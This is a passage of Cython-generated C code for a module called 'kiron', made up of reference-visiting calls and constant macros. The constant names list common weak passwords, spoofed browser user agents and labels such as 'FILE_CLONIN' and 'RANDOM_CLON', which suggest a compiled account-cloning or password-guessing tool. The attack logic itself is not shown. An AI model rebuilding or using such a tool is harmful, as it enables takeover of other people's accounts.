  Py_VISIT(traverse_module_state->__pyx_int_13);
  Py_VISIT(traverse_module_state->__pyx_int_16);
  Py_VISIT(traverse_module_state->__pyx_int_17);
  Py_VISIT(traverse_module_state->__pyx_int_18);
  Py_VISIT(traverse_module_state->__pyx_int_19);
  Py_VISIT(traverse_module_state->__pyx_int_20);
  Py_VISIT(traverse_module_state->__pyx_int_30);
  Py_VISIT(traverse_module_state->__pyx_int_34);
  Py_VISIT(traverse_module_state->__pyx_int_36);
  Py_VISIT(traverse_module_state->__pyx_int_38);
  Py_VISIT(traverse_module_state->__pyx_int_39);
  Py_VISIT(traverse_module_state->__pyx_int_40);
  Py_VISIT(traverse_module_state->__pyx_int_42);
  Py_VISIT(traverse_module_state->__pyx_int_44);
  Py_VISIT(traverse_module_state->__pyx_int_49);
  Py_VISIT(traverse_module_state->__pyx_int_59);
  Py_VISIT(traverse_module_state->__pyx_int_77);
  Py_VISIT(traverse_module_state->__pyx_int_89);
  Py_VISIT(traverse_module_state->__pyx_int_99);
  Py_VISIT(traverse_module_state->__pyx_int_110);
  Py_VISIT(traverse_module_state->__pyx_int_111);
  Py_VISIT(traverse_module_state->__pyx_int_120);
  Py_VISIT(traverse_module_state->__pyx_int_311);
  Py_VISIT(traverse_module_state->__pyx_int_499);
  Py_VISIT(traverse_module_state->__pyx_int_511);
  Py_VISIT(traverse_module_state->__pyx_int_552);
  Py_VISIT(traverse_module_state->__pyx_int_599);
  Py_VISIT(traverse_module_state->__pyx_int_661);
  Py_VISIT(traverse_module_state->__pyx_int_742);
  Py_VISIT(traverse_module_state->__pyx_int_999);
  Py_VISIT(traverse_module_state->__pyx_int_1111);
  Py_VISIT(traverse_module_state->__pyx_int_2200);
  Py_VISIT(traverse_module_state->__pyx_int_7120);
  Py_VISIT(traverse_module_state->__pyx_int_7999);
  Py_VISIT(traverse_module_state->__pyx_int_9999);
  Py_VISIT(traverse_module_state->__pyx_int_11111);
  Py_VISIT(traverse_module_state->__pyx_int_20000);
  Py_VISIT(traverse_module_state->__pyx_int_40000);
  Py_VISIT(traverse_module_state->__pyx_int_66666);
  Py_VISIT(traverse_module_state->__pyx_int_99999);
  Py_VISIT(traverse_module_state->__pyx_int_111111);
  Py_VISIT(traverse_module_state->__pyx_int_199999);
  Py_VISIT(traverse_module_state->__pyx_int_900000);
  Py_VISIT(traverse_module_state->__pyx_int_999999);
  Py_VISIT(traverse_module_state->__pyx_int_1111111);
  Py_VISIT(traverse_module_state->__pyx_int_7777777);
  Py_VISIT(traverse_module_state->__pyx_int_20000000);
  Py_VISIT(traverse_module_state->__pyx_int_30000000);
  Py_VISIT(traverse_module_state->__pyx_int_100000000);
  Py_VISIT(traverse_module_state->__pyx_int_111111111);
  Py_VISIT(traverse_module_state->__pyx_int_999999999);
  Py_VISIT(traverse_module_state->__pyx_int_1000000000);
  Py_VISIT(traverse_module_state->__pyx_int_9999999999);
  Py_VISIT(traverse_module_state->__pyx_tuple_);
  Py_VISIT(traverse_module_state->__pyx_tuple__2);
  Py_VISIT(traverse_module_state->__pyx_tuple__3);
  Py_VISIT(traverse_module_state->__pyx_tuple__4);
  Py_VISIT(traverse_module_state->__pyx_tuple__5);
  Py_VISIT(traverse_module_state->__pyx_tuple__6);
  Py_VISIT(traverse_module_state->__pyx_tuple__7);
  Py_VISIT(traverse_module_state->__pyx_tuple__8);
  Py_VISIT(traverse_module_state->__pyx_tuple__9);
  Py_VISIT(traverse_module_state->__pyx_slice__65);
  Py_VISIT(traverse_module_state->__pyx_slice__66);
  Py_VISIT(traverse_module_state->__pyx_slice__67);
  Py_VISIT(traverse_module_state->__pyx_tuple__10);
  Py_VISIT(traverse_module_state->__pyx_tuple__12);
  Py_VISIT(traverse_module_state->__pyx_tuple__13);
  Py_VISIT(traverse_module_state->__pyx_tuple__14);
  Py_VISIT(traverse_module_state->__pyx_tuple__15);
  Py_VISIT(traverse_module_state->__pyx_tuple__16);
  Py_VISIT(traverse_module_state->__pyx_tuple__17);
  Py_VISIT(traverse_module_state->__pyx_tuple__18);
  Py_VISIT(traverse_module_state->__pyx_tuple__19);
  Py_VISIT(traverse_module_state->__pyx_tuple__20);
  Py_VISIT(traverse_module_state->__pyx_tuple__21);
  Py_VISIT(traverse_module_state->__pyx_tuple__22);
  Py_VISIT(traverse_module_state->__pyx_tuple__23);
  Py_VISIT(traverse_module_state->__pyx_tuple__24);
  Py_VISIT(traverse_module_state->__pyx_tuple__26);
  Py_VISIT(traverse_module_state->__pyx_tuple__27);
  Py_VISIT(traverse_module_state->__pyx_tuple__28);
  Py_VISIT(traverse_module_state->__pyx_tuple__29);
  Py_VISIT(traverse_module_state->__pyx_tuple__30);
  Py_VISIT(traverse_module_state->__pyx_tuple__31);
  Py_VISIT(traverse_module_state->__pyx_tuple__34);
  Py_VISIT(traverse_module_state->__pyx_tuple__35);
  Py_VISIT(traverse_module_state->__pyx_tuple__36);
  Py_VISIT(traverse_module_state->__pyx_tuple__37);
  Py_VISIT(traverse_module_state->__pyx_tuple__39);
  Py_VISIT(traverse_module_state->__pyx_tuple__40);
  Py_VISIT(traverse_module_state->__pyx_tuple__41);
  Py_VISIT(traverse_module_state->__pyx_tuple__42);
  Py_VISIT(traverse_module_state->__pyx_tuple__43);
  Py_VISIT(traverse_module_state->__pyx_tuple__44);
  Py_VISIT(traverse_module_state->__pyx_tuple__45);
  Py_VISIT(traverse_module_state->__pyx_tuple__46);
  Py_VISIT(traverse_module_state->__pyx_tuple__47);
  Py_VISIT(traverse_module_state->__pyx_tuple__49);
  Py_VISIT(traverse_module_state->__pyx_tuple__50);
  Py_VISIT(traverse_module_state->__pyx_tuple__51);
  Py_VISIT(traverse_module_state->__pyx_tuple__52);
  Py_VISIT(traverse_module_state->__pyx_tuple__53);
  Py_VISIT(traverse_module_state->__pyx_tuple__55);
  Py_VISIT(traverse_module_state->__pyx_tuple__56);
  Py_VISIT(traverse_module_state->__pyx_tuple__57);
  Py_VISIT(traverse_module_state->__pyx_tuple__58);
  Py_VISIT(traverse_module_state->__pyx_tuple__59);
  Py_VISIT(traverse_module_state->__pyx_tuple__60);
  Py_VISIT(traverse_module_state->__pyx_tuple__61);
  Py_VISIT(traverse_module_state->__pyx_tuple__62);
  Py_VISIT(traverse_module_state->__pyx_tuple__64);
  Py_VISIT(traverse_module_state->__pyx_tuple__68);
  Py_VISIT(traverse_module_state->__pyx_tuple__69);
  Py_VISIT(traverse_module_state->__pyx_tuple__70);
  Py_VISIT(traverse_module_state->__pyx_tuple__73);
  Py_VISIT(traverse_module_state->__pyx_tuple__76);
  Py_VISIT(traverse_module_state->__pyx_tuple__78);
  Py_VISIT(traverse_module_state->__pyx_tuple__79);
  Py_VISIT(traverse_module_state->__pyx_tuple__80);
  Py_VISIT(traverse_module_state->__pyx_tuple__81);
  Py_VISIT(traverse_module_state->__pyx_tuple__82);
  Py_VISIT(traverse_module_state->__pyx_tuple__86);
  Py_VISIT(traverse_module_state->__pyx_tuple__87);
  Py_VISIT(traverse_module_state->__pyx_tuple__89);
  Py_VISIT(traverse_module_state->__pyx_tuple__90);
  Py_VISIT(traverse_module_state->__pyx_tuple__91);
  Py_VISIT(traverse_module_state->__pyx_tuple__92);
  Py_VISIT(traverse_module_state->__pyx_tuple__94);
  Py_VISIT(traverse_module_state->__pyx_tuple__96);
  Py_VISIT(traverse_module_state->__pyx_tuple__97);
  Py_VISIT(traverse_module_state->__pyx_tuple__98);
  Py_VISIT(traverse_module_state->__pyx_tuple__99);
  Py_VISIT(traverse_module_state->__pyx_tuple__100);
  Py_VISIT(traverse_module_state->__pyx_tuple__101);
  Py_VISIT(traverse_module_state->__pyx_tuple__102);
  Py_VISIT(traverse_module_state->__pyx_tuple__103);
  Py_VISIT(traverse_module_state->__pyx_tuple__104);
  Py_VISIT(traverse_module_state->__pyx_tuple__105);
  Py_VISIT(traverse_module_state->__pyx_tuple__106);
  Py_VISIT(traverse_module_state->__pyx_tuple__107);
  Py_VISIT(traverse_module_state->__pyx_tuple__108);
  Py_VISIT(traverse_module_state->__pyx_tuple__109);
  Py_VISIT(traverse_module_state->__pyx_tuple__110);
  Py_VISIT(traverse_module_state->__pyx_tuple__111);
  Py_VISIT(traverse_module_state->__pyx_tuple__112);
  Py_VISIT(traverse_module_state->__pyx_tuple__113);
  Py_VISIT(traverse_module_state->__pyx_tuple__114);
  Py_VISIT(traverse_module_state->__pyx_tuple__115);
  Py_VISIT(traverse_module_state->__pyx_tuple__116);
  Py_VISIT(traverse_module_state->__pyx_tuple__117);
  Py_VISIT(traverse_module_state->__pyx_tuple__118);
  Py_VISIT(traverse_module_state->__pyx_tuple__120);
  Py_VISIT(traverse_module_state->__pyx_tuple__121);
  Py_VISIT(traverse_module_state->__pyx_tuple__122);
  Py_VISIT(traverse_module_state->__pyx_tuple__123);
  Py_VISIT(traverse_module_state->__pyx_tuple__125);
  Py_VISIT(traverse_module_state->__pyx_tuple__126);
  Py_VISIT(traverse_module_state->__pyx_tuple__127);
  Py_VISIT(traverse_module_state->__pyx_tuple__128);
  Py_VISIT(traverse_module_state->__pyx_tuple__129);
  Py_VISIT(traverse_module_state->__pyx_tuple__130);
  Py_VISIT(traverse_module_state->__pyx_tuple__133);
  Py_VISIT(traverse_module_state->__pyx_tuple__136);
  Py_VISIT(traverse_module_state->__pyx_tuple__138);
  Py_VISIT(traverse_module_state->__pyx_tuple__140);
  Py_VISIT(traverse_module_state->__pyx_tuple__142);
  Py_VISIT(traverse_module_state->__pyx_tuple__144);
  Py_VISIT(traverse_module_state->__pyx_tuple__146);
  Py_VISIT(traverse_module_state->__pyx_tuple__147);
  Py_VISIT(traverse_module_state->__pyx_tuple__148);
  Py_VISIT(traverse_module_state->__pyx_tuple__149);
  Py_VISIT(traverse_module_state->__pyx_tuple__151);
  Py_VISIT(traverse_module_state->__pyx_tuple__153);
  Py_VISIT(traverse_module_state->__pyx_tuple__155);
  Py_VISIT(traverse_module_state->__pyx_tuple__157);
  Py_VISIT(traverse_module_state->__pyx_codeobj__95);
  Py_VISIT(traverse_module_state->__pyx_codeobj__131);
  Py_VISIT(traverse_module_state->__pyx_codeobj__132);
  Py_VISIT(traverse_module_state->__pyx_codeobj__134);
  Py_VISIT(traverse_module_state->__pyx_codeobj__135);
  Py_VISIT(traverse_module_state->__pyx_codeobj__137);
  Py_VISIT(traverse_module_state->__pyx_codeobj__139);
  Py_VISIT(traverse_module_state->__pyx_codeobj__141);
  Py_VISIT(traverse_module_state->__pyx_codeobj__143);
  Py_VISIT(traverse_module_state->__pyx_codeobj__145);
  Py_VISIT(traverse_module_state->__pyx_codeobj__150);
  Py_VISIT(traverse_module_state->__pyx_codeobj__152);
  Py_VISIT(traverse_module_state->__pyx_codeobj__154);
  Py_VISIT(traverse_module_state->__pyx_codeobj__156);
  Py_VISIT(traverse_module_state->__pyx_codeobj__158);
  Py_VISIT(traverse_module_state->__pyx_codeobj__159);
  return 0;
}
#endif
/* #### Code section: module_state_defines ### */
#define __pyx_d __pyx_mstate_global->__pyx_d
#define __pyx_b __pyx_mstate_global->__pyx_b
#define __pyx_cython_runtime __pyx_mstate_global->__pyx_cython_runtime
#define __pyx_empty_tuple __pyx_mstate_global->__pyx_empty_tuple
#define __pyx_empty_bytes __pyx_mstate_global->__pyx_empty_bytes
#define __pyx_empty_unicode __pyx_mstate_global->__pyx_empty_unicode
#ifdef __Pyx_CyFunction_USED
#define __pyx_CyFunctionType __pyx_mstate_global->__pyx_CyFunctionType
#endif
#ifdef __Pyx_FusedFunction_USED
#define __pyx_FusedFunctionType __pyx_mstate_global->__pyx_FusedFunctionType
#endif
#ifdef __Pyx_Generator_USED
#define __pyx_GeneratorType __pyx_mstate_global->__pyx_GeneratorType
#endif
#ifdef __Pyx_IterableCoroutine_USED
#define __pyx_IterableCoroutineType __pyx_mstate_global->__pyx_IterableCoroutineType
#endif
#ifdef __Pyx_Coroutine_USED
#define __pyx_CoroutineAwaitType __pyx_mstate_global->__pyx_CoroutineAwaitType
#endif
#ifdef __Pyx_Coroutine_USED
#define __pyx_CoroutineType __pyx_mstate_global->__pyx_CoroutineType
#endif
#if CYTHON_USE_MODULE_STATE
#define __pyx_type_5kiron___pyx_scope_struct__genexpr __pyx_mstate_global->__pyx_type_5kiron___pyx_scope_struct__genexpr
#define __pyx_type_5kiron___pyx_scope_struct_1_genexpr __pyx_mstate_global->__pyx_type_5kiron___pyx_scope_struct_1_genexpr
#define __pyx_type_5kiron___pyx_scope_struct_2_genexpr __pyx_mstate_global->__pyx_type_5kiron___pyx_scope_struct_2_genexpr
#define __pyx_type_5kiron___pyx_scope_struct_3_genexpr __pyx_mstate_global->__pyx_type_5kiron___pyx_scope_struct_3_genexpr
#define __pyx_type_5kiron___pyx_scope_struct_4_genexpr __pyx_mstate_global->__pyx_type_5kiron___pyx_scope_struct_4_genexpr
#endif
#define __pyx_ptype_5kiron___pyx_scope_struct__genexpr __pyx_mstate_global->__pyx_ptype_5kiron___pyx_scope_struct__genexpr
#define __pyx_ptype_5kiron___pyx_scope_struct_1_genexpr __pyx_mstate_global->__pyx_ptype_5kiron___pyx_scope_struct_1_genexpr
#define __pyx_ptype_5kiron___pyx_scope_struct_2_genexpr __pyx_mstate_global->__pyx_ptype_5kiron___pyx_scope_struct_2_genexpr
#define __pyx_ptype_5kiron___pyx_scope_struct_3_genexpr __pyx_mstate_global->__pyx_ptype_5kiron___pyx_scope_struct_3_genexpr
#define __pyx_ptype_5kiron___pyx_scope_struct_4_genexpr __pyx_mstate_global->__pyx_ptype_5kiron___pyx_scope_struct_4_genexpr
#define __pyx_kp_s_0 __pyx_mstate_global->__pyx_kp_s_0
#define __pyx_kp_u_0 __pyx_mstate_global->__pyx_kp_u_0
#define __pyx_kp_u_00 __pyx_mstate_global->__pyx_kp_u_00
#define __pyx_kp_s_01 __pyx_mstate_global->__pyx_kp_s_01
#define __pyx_kp_u_011_en_us_AppleWebKit_537_36 __pyx_mstate_global->__pyx_kp_u_011_en_us_AppleWebKit_537_36
#define __pyx_kp_s_02 __pyx_mstate_global->__pyx_kp_s_02
#define __pyx_kp_s_03 __pyx_mstate_global->__pyx_kp_s_03
#define __pyx_kp_s_04 __pyx_mstate_global->__pyx_kp_s_04
#define __pyx_kp_s_05 __pyx_mstate_global->__pyx_kp_s_05
#define __pyx_kp_s_06 __pyx_mstate_global->__pyx_kp_s_06
#define __pyx_kp_s_07 __pyx_mstate_global->__pyx_kp_s_07
#define __pyx_kp_s_08 __pyx_mstate_global->__pyx_kp_s_08
#define __pyx_kp_s_09 __pyx_mstate_global->__pyx_kp_s_09
#define __pyx_kp_s_0_0 __pyx_mstate_global->__pyx_kp_s_0_0
#define __pyx_kp_u_0_0 __pyx_mstate_global->__pyx_kp_u_0_0
#define __pyx_kp_s_0_1 __pyx_mstate_global->__pyx_kp_s_0_1
#define __pyx_kp_s_0_2 __pyx_mstate_global->__pyx_kp_s_0_2
#define __pyx_kp_u_0_3 __pyx_mstate_global->__pyx_kp_u_0_3
#define __pyx_kp_u_0_38_5_244m_38_5_46m_EXIT_TOOL __pyx_mstate_global->__pyx_kp_u_0_38_5_244m_38_5_46m_EXIT_TOOL
#define __pyx_kp_u_0_Safari_534 __pyx_mstate_global->__pyx_kp_u_0_Safari_534
#define __pyx_kp_u_0_Safari_537_36 __pyx_mstate_global->__pyx_kp_u_0_Safari_537_36
#define __pyx_kp_u_0_Win64_x64_AppleWebKit_537_36 __pyx_mstate_global->__pyx_kp_u_0_Win64_x64_AppleWebKit_537_36
#define __pyx_kp_s_1 __pyx_mstate_global->__pyx_kp_s_1
#define __pyx_kp_s_10 __pyx_mstate_global->__pyx_kp_s_10
#define __pyx_kp_s_10000 __pyx_mstate_global->__pyx_kp_s_10000
#define __pyx_kp_s_100000 __pyx_mstate_global->__pyx_kp_s_100000
#define __pyx_kp_s_102030 __pyx_mstate_global->__pyx_kp_s_102030
#define __pyx_kp_u_10_1_YaSearchBrowser __pyx_mstate_global->__pyx_kp_u_10_1_YaSearchBrowser
#define __pyx_kp_s_11 __pyx_mstate_global->__pyx_kp_s_11
#define __pyx_kp_s_112233 __pyx_mstate_global->__pyx_kp_s_112233
#define __pyx_kp_s_12 __pyx_mstate_global->__pyx_kp_s_12
#define __pyx_kp_s_123123 __pyx_mstate_global->__pyx_kp_s_123123
#define __pyx_kp_s_123456 __pyx_mstate_global->__pyx_kp_s_123456
#define __pyx_kp_s_1234567 __pyx_mstate_global->__pyx_kp_s_1234567
#define __pyx_kp_s_12345678 __pyx_mstate_global->__pyx_kp_s_12345678
#define __pyx_kp_s_123456789 __pyx_mstate_global->__pyx_kp_s_123456789
#define __pyx_kp_s_1234567890 __pyx_mstate_global->__pyx_kp_s_1234567890
#define __pyx_kp_u_136_Mobile_Safari __pyx_mstate_global->__pyx_kp_u_136_Mobile_Safari
#define __pyx_kp_s_13_Pro __pyx_mstate_global->__pyx_kp_s_13_Pro
#define __pyx_kp_u_1_0 __pyx_mstate_global->__pyx_kp_u_1_0
#define __pyx_kp_s_1_2 __pyx_mstate_global->__pyx_kp_s_1_2
#define __pyx_kp_s_1_33m __pyx_mstate_global->__pyx_kp_s_1_33m
#define __pyx_kp_s_1_34m __pyx_mstate_global->__pyx_kp_s_1_34m
#define __pyx_kp_s_1_34m_1_34m_38_5_244m_38_5_46m __pyx_mstate_global->__pyx_kp_s_1_34m_1_34m_38_5_244m_38_5_46m
#define __pyx_kp_s_1_37m __pyx_mstate_global->__pyx_kp_s_1_37m
#define __pyx_kp_u_1_38_5_244m_38_5_46m_FILE_CLONIN __pyx_mstate_global->__pyx_kp_u_1_38_5_244m_38_5_46m_FILE_CLONIN
#define __pyx_kp_u_1_38_5_244m_38_5_46m_METHOD_38_5 __pyx_mstate_global->__pyx_kp_u_1_38_5_244m_38_5_46m_METHOD_38_5
#define __pyx_kp_s_1_96m __pyx_mstate_global->__pyx_kp_s_1_96m
#define __pyx_kp_s_1_97m __pyx_mstate_global->__pyx_kp_s_1_97m
#define __pyx_kp_s_1_97m_1_37m __pyx_mstate_global->__pyx_kp_s_1_97m_1_37m
#define __pyx_kp_u_1_97m_1_37m __pyx_mstate_global->__pyx_kp_u_1_97m_1_37m
#define __pyx_kp_u_1_97m_1_37m_2 __pyx_mstate_global->__pyx_kp_u_1_97m_1_37m_2
#define __pyx_kp_u_1_97m_1_91m_1_92m_1_93m_38_5_46 __pyx_mstate_global->__pyx_kp_u_1_97m_1_91m_1_92m_1_93m_38_5_46
#define __pyx_kp_u_1_97m_2 __pyx_mstate_global->__pyx_kp_u_1_97m_2
#define __pyx_kp_s_1_97m_38_5_244m_1_97m_38_5_244m __pyx_mstate_global->__pyx_kp_s_1_97m_38_5_244m_1_97m_38_5_244m
#define __pyx_kp_u_1_BroPP_1_0_SA_3_Mobile_Safari __pyx_mstate_global->__pyx_kp_u_1_BroPP_1_0_SA_3_Mobile_Safari
#define __pyx_kp_u_1_en_US_AppleWebKit_534 __pyx_mstate_global->__pyx_kp_u_1_en_US_AppleWebKit_534
#define __pyx_kp_s_2 __pyx_mstate_global->__pyx_kp_s_2
#define __pyx_kp_s_203040 __pyx_mstate_global->__pyx_kp_s_203040
#define __pyx_kp_s_210 __pyx_mstate_global->__pyx_kp_s_210
#define __pyx_kp_u_25 __pyx_mstate_global->__pyx_kp_u_25
#define __pyx_kp_s_28 __pyx_mstate_global->__pyx_kp_s_28
#define __pyx_kp_s_29 __pyx_mstate_global->__pyx_kp_s_29
#define __pyx_kp_u_2_38_5_244m_38_5_46m_METHOD_38_5 __pyx_mstate_global->__pyx_kp_u_2_38_5_244m_38_5_46m_METHOD_38_5
#define __pyx_kp_u_2_38_5_244m_38_5_46m_RANDOM_CLON __pyx_mstate_global->__pyx_kp_u_2_38_5_244m_38_5_46m_RANDOM_CLON
#define __pyx_kp_s_2_AYYUB __pyx_mstate_global->__pyx_kp_s_2_AYYUB
#define __pyx_kp_s_3 __pyx_mstate_global->__pyx_kp_s_3
#define __pyx_kp_s_350685531728_62f8ce9f74b12f84c12 __pyx_mstate_global->__pyx_kp_s_350685531728_62f8ce9f74b12f84c12
#define __pyx_kp_s_38_5_121m __pyx_mstate_global->__pyx_kp_s_38_5_121m
#define __pyx_kp_s_38_5_122m __pyx_mstate_global->__pyx_kp_s_38_5_122m
#define __pyx_kp_s_38_5_123m __pyx_mstate_global->__pyx_kp_s_38_5_123m
#define __pyx_kp_s_38_5_14m __pyx_mstate_global->__pyx_kp_s_38_5_14m
#define __pyx_kp_s_38_5_196m __pyx_mstate_global->__pyx_kp_s_38_5_196m
#define __pyx_kp_s_38_5_205m __pyx_mstate_global->__pyx_kp_s_38_5_205m
#define __pyx_kp_u_38_5_244m __pyx_mstate_global->__pyx_kp_u_38_5_244m
#define __pyx_kp_s_38_5_244m_1_97m0_38_5_244m_38_5 __pyx_mstate_global->__pyx_kp_s_38_5_244m_1_97m0_38_5_244m_38_5
#define __pyx_kp_u_38_5_244m_1_97m1_38_5_244m_38_5 __pyx_mstate_global->__pyx_kp_u_38_5_244m_1_97m1_38_5_244m_38_5
#define __pyx_kp_s_38_5_244m_1_97m1_38_5_244m_38_5_2 __pyx_mstate_global->__pyx_kp_s_38_5_244m_1_97m1_38_5_244m_38_5_2
#define __pyx_kp_u_38_5_244m_1_97m_38_5_244m_38_5 __pyx_mstate_global->__pyx_kp_u_38_5_244m_1_97m_38_5_244m_38_5
#define __pyx_kp_u_38_5_244m_1_97m_38_5_244m_38_5_10 __pyx_mstate_global->__pyx_kp_u_38_5_244m_1_97m_38_5_244m_38_5_10
#define __pyx_kp_u_38_5_244m_1_97m_38_5_244m_38_5_11 __pyx_mstate_global->__pyx_kp_u_38_5_244m_1_97m_38_5_244m_38_5_11
#define __pyx_kp_u_38_5_244m_1_97m_38_5_244m_38_5_12 __pyx_mstate_global->__pyx_kp_u_38_5_244m_1_97m_38_5_244m_38_5_12
#define __pyx_kp_u_38_5_244m_1_97m_38_5_244m_38_5_13 __pyx_mstate_global->__pyx_kp_u_38_5_244m_1_97m_38_5_244m_38_5_13
#define __pyx_kp_u_38_5_244m_1_97m_38_5_244m_38_5_14 __pyx_mstate_global->__pyx_kp_u_38_5_244m_1_97m_38_5_244m_38_5_14
#define __pyx_kp_u_38_5_244m_1_97m_38_5_244m_38_5_15 __pyx_mstate_global->__pyx_kp_u_38_5_244m_1_97m_38_5_244m_38_5_15
#define __pyx_kp_u_38_5_244m_1_97m_38_5_244m_38_5_16 __pyx_mstate_global->__pyx_kp_u_38_5_244m_1_97m_38_5_244m_38_5_16
#define __pyx_kp_u_38_5_244m_1_97m_38_5_244m_38_5_17 __pyx_mstate_global->__pyx_kp_u_38_5_244m_1_97m_38_5_244m_38_5_17
#define __pyx_kp_u_38_5_244m_1_97m_38_5_244m_38_5_18 __pyx_mstate_global->__pyx_kp_u_38_5_244m_1_97m_38_5_244m_38_5_18
#define __pyx_kp_s_38_5_244m_1_97m_38_5_244m_38_5_19 __pyx_mstate_global->__pyx_kp_s_38_5_244m_1_97m_38_5_244m_38_5_19
#define __pyx_kp_u_38_5_244m_1_97m_38_5_244m_38_5_2 __pyx_mstate_global->__pyx_kp_u_38_5_244m_1_97m_38_5_244m_38_5_2
#define __pyx_kp_u_38_5_244m_1_97m_38_5_244m_38_5_3 __pyx_mstate_global->__pyx_kp_u_38_5_244m_1_97m_38_5_244m_38_5_3
#define __pyx_kp_u_38_5_244m_1_97m_38_5_244m_38_5_4 __pyx_mstate_global->__pyx_kp_u_38_5_244m_1_97m_38_5_244m_38_5_4
#define __pyx_kp_u_38_5_244m_1_97m_38_5_244m_38_5_5 __pyx_mstate_global->__pyx_kp_u_38_5_244m_1_97m_38_5_244m_38_5_5
#define __pyx_kp_u_38_5_244m_1_97m_38_5_244m_38_5_6 __pyx_mstate_global->__pyx_kp_u_38_5_244m_1_97m_38_5_244m_38_5_6
#define __pyx_kp_u_38_5_244m_1_97m_38_5_244m_38_5_7 __pyx_mstate_global->__pyx_kp_u_38_5_244m_1_97m_38_5_244m_38_5_7
#define __pyx_kp_u_38_5_244m_1_97m_38_5_244m_38_5_8 __pyx_mstate_global->__pyx_kp_u_38_5_244m_1_97m_38_5_244m_38_5_8
#define __pyx_kp_s_38_5_244m_1_97m_38_5_244m_38_5_9 __pyx_mstate_global->__pyx_kp_s_38_5_244m_1_97m_38_5_244m_38_5_9
#define __pyx_kp_u_38_5_244m_2 __pyx_mstate_global->__pyx_kp_u_38_5_244m_2
#define __pyx_kp_u_38_5_244m_3 __pyx_mstate_global->__pyx_kp_u_38_5_244m_3
#define __pyx_kp_u_38_5_244m_38_5_244mAYYUB_OK_38 __pyx_mstate_global->__pyx_kp_u_38_5_244m_38_5_244mAYYUB_OK_38
#define __pyx_kp_u_38_5_244m_38_5_244m_38_5_46m_38 __pyx_mstate_global->__pyx_kp_u_38_5_244m_38_5_244m_38_5_46m_38
#define __pyx_kp_u_38_5_244m_38_5_244m_38_5_46m_38_2 __pyx_mstate_global->__pyx_kp_u_38_5_244m_38_5_244m_38_5_46m_38_2
#define __pyx_kp_u_38_5_244m_38_5_46m __pyx_mstate_global->__pyx_kp_u_38_5_244m_38_5_46m
#define __pyx_kp_u_38_5_244m_38_5_46mAYYUB_38_5_24 __pyx_mstate_global->__pyx_kp_u_38_5_244m_38_5_46mAYYUB_38_5_24
#define __pyx_kp_u_38_5_244m_38_5_46mAYYUB_OK_38_5 __pyx_mstate_global->__pyx_kp_u_38_5_244m_38_5_46mAYYUB_OK_38_5
#define __pyx_kp_u_38_5_244m_38_5_46mAYYUB_OK_38_5_2 __pyx_mstate_global->__pyx_kp_u_38_5_244m_38_5_46mAYYUB_OK_38_5_2
#define __pyx_kp_u_38_5_244m_38_5_46mAYYUB_XD_38_5 __pyx_mstate_global->__pyx_kp_u_38_5_244m_38_5_46mAYYUB_XD_38_5
#define __pyx_kp_u_38_5_244m_38_5_46mOK_1_37m_38_5 __pyx_mstate_global->__pyx_kp_u_38_5_244m_38_5_46mOK_1_37m_38_5
#define __pyx_kp_u_38_5_244m_38_5_46m_2 __pyx_mstate_global->__pyx_kp_u_38_5_244m_38_5_46m_2
#define __pyx_kp_u_38_5_244m_38_5_46m_3 __pyx_mstate_global->__pyx_kp_u_38_5_244m_38_5_46m_3
#define __pyx_kp_u_38_5_244m_38_5_46m_38_5_244m __pyx_mstate_global->__pyx_kp_u_38_5_244m_38_5_46m_38_5_244m
#define __pyx_kp_u_38_5_244m_38_5_46m_38_5_244m_38 __pyx_mstate_global->__pyx_kp_u_38_5_244m_38_5_46m_38_5_244m_38
#define __pyx_kp_s_38_5_244m_38_5_46m_38_5_244m_38_2 __pyx_mstate_global->__pyx_kp_s_38_5_244m_38_5_46m_38_5_244m_38_2
#define __pyx_kp_s_38_5_244m_38_5_46m_38_5_244m_38_3 __pyx_mstate_global->__pyx_kp_s_38_5_244m_38_5_46m_38_5_244m_38_3
#define __pyx_kp_s_38_5_244m_38_5_46m_38_5_244m_38_4 __pyx_mstate_global->__pyx_kp_s_38_5_244m_38_5_46m_38_5_244m_38_4
#define __pyx_kp_u_38_5_244m_38_5_46m_4 __pyx_mstate_global->__pyx_kp_u_38_5_244m_38_5_46m_4
#define __pyx_kp_u_38_5_244m_38_5_46m_5 __pyx_mstate_global->__pyx_kp_u_38_5_244m_38_5_46m_5
#define __pyx_kp_u_38_5_244m_38_5_46m_6 __pyx_mstate_global->__pyx_kp_u_38_5_244m_38_5_46m_6
#define __pyx_kp_u_38_5_244m_38_5_46m_7 __pyx_mstate_global->__pyx_kp_u_38_5_244m_38_5_46m_7
#define __pyx_kp_s_38_5_244m_38_5_46m_8 __pyx_mstate_global->__pyx_kp_s_38_5_244m_38_5_46m_8
#define __pyx_kp_u_38_5_244m_38_5_46m_CHOICE __pyx_mstate_global->__pyx_kp_u_38_5_244m_38_5_46m_CHOICE
#define __pyx_kp_u_38_5_244m_38_5_46m_DO_YOU_WENT __pyx_mstate_global->__pyx_kp_u_38_5_244m_38_5_46m_DO_YOU_WENT
#define __pyx_kp_u_38_5_244m_38_5_46m_EXAMPLE_sdca __pyx_mstate_global->__pyx_kp_u_38_5_244m_38_5_46m_EXAMPLE_sdca
#define __pyx_kp_u_38_5_244m_38_5_46m_EXIT_DONE __pyx_mstate_global->__pyx_kp_u_38_5_244m_38_5_46m_EXIT_DONE
#define __pyx_kp_u_38_5_244m_38_5_46m_FILE_LOCATIO __pyx_mstate_global->__pyx_kp_u_38_5_244m_38_5_46m_FILE_LOCATIO
#define __pyx_kp_u_38_5_244m_38_5_46m_FILE_NAME __pyx_mstate_global->__pyx_kp_u_38_5_244m_38_5_46m_FILE_NAME
#define __pyx_kp_u_38_5_244m_38_5_46m_IF_NO_RESULT __pyx_mstate_global->__pyx_kp_u_38_5_244m_38_5_46m_IF_NO_RESULT
#define __pyx_kp_u_38_5_244m_38_5_46m_NO_INTERNET __pyx_mstate_global->__pyx_kp_u_38_5_244m_38_5_46m_NO_INTERNET
#define __pyx_kp_u_38_5_244m_38_5_46m_OPTION_NOT_F __pyx_mstate_global->__pyx_kp_u_38_5_244m_38_5_46m_OPTION_NOT_F
#define __pyx_kp_u_38_5_244m_38_5_46m_PASSWORD_LIM __pyx_mstate_global->__pyx_kp_u_38_5_244m_38_5_46m_PASSWORD_LIM
#define __pyx_kp_u_38_5_244m_38_5_46m_PASSWORD_NO __pyx_mstate_global->__pyx_kp_u_38_5_244m_38_5_46m_PASSWORD_NO
#define __pyx_kp_u_38_5_244m_38_5_46m_PASS_38_5_24 __pyx_mstate_global->__pyx_kp_u_38_5_244m_38_5_46m_PASS_38_5_24
